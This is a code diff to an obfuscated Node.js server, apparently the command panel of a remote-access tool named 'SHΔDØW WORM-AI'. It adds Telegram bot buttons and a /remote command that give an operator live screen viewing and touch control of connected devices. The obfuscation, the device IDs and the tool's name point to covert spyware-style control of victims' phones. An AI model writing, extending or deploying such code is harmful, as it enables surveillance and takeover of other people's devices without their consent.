@@ -354,7 +354,7 @@ const viewerHTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
-console.log('✅ SHΔDØW WORM-AI💀🔥 Live Stream Features Added (Integrated on Port 3000)');
+console.log('✅ SHΔDØW WORM-AI💀🔥 Live Stream Page Loaded');
 console.log('='.repeat(50));
 
 // ================================================== //
@@ -956,7 +956,11 @@ const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Se
         _0x286428(0x233) + _0x286428(0x382),
         _0x286428(0x2ca) + _0x286428(0x40d),
         _0x286428(0x365) + _0x286428(0x268) + _0x286428(0x323),
-        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯'
+        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯',
+        // ===== الأزرار الجديدة للبث المباشر والتحكم =====
+        '📺 بث مباشر',
+        '📡 البثوث النشطة',
+        '🖱️ تحكم عن بعد'
     ];
 
 // ========== إضافة مسار public بعد تعريف fs ========== //
@@ -1067,7 +1071,7 @@ app.post('/stream/touch/:deviceId', express.json(), (req, res) => {
     }
 });
 
-// ========== إضافة أوامر البوت ========== //
+// ========== إضافة أوامر البوت الجديدة ========== //
 bot.onText(/\/live (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const deviceId = match[1];
@@ -1110,6 +1114,30 @@ bot.onText(/\/streams/, (msg) => {
     }
 });
 
+bot.onText(/\/remote (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const deviceId = match[1];
+    
+    if (activeStreams.has(deviceId)) {
+        const stream = activeStreams.get(deviceId);
+        const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
+        
+        bot.sendMessage(chatId, 
+            `🖱️ <b>التحكم عن بعد - الجهاز ${deviceId}</b>\n\n` +
+            `🌐 <b>رابط التحكم:</b>\n` +
+            `<code>${streamUrl}</code>\n\n` +
+            `📱 <b>تعليمات:</b>\n` +
+            `• انقر على الشاشة للتحكم باللمس\n` +
+            `• استخدم الأزرار للسحب والضغط الطويل\n` +
+            `• حرك الماوس لمشاهدة الإحداثيات`,
+            { parse_mode: 'HTML' }
+        );
+    } else {
+        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
+    }
+});
+
+// بداية الكود الأصلي
 app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
     const _0x4afaa0 = _0x286428, _0x30b554 = { 'VqrFV': _0x4afaa0(0x326) + _0x4afaa0(0x2f1) + _0x4afaa0(0x3aa) + _0x4afaa0(0x2c9) };
     _0x364a1f[_0x4afaa0(0x2f7)](_0x30b554[_0x4afaa0(0x2fe)]);
